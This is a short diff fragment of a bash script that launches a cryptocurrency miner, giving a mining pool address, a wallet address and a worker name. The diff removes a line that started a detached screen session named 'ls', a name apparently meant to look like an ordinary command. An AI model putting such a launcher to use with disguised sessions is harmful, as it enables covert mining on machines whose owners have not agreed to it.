@@ -1,6 +1,5 @@
 #!/bin/bash
 chmod +x cumin
-screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
 WORKER=$(echo $(shuf -i 1-1 -n 1)-X)
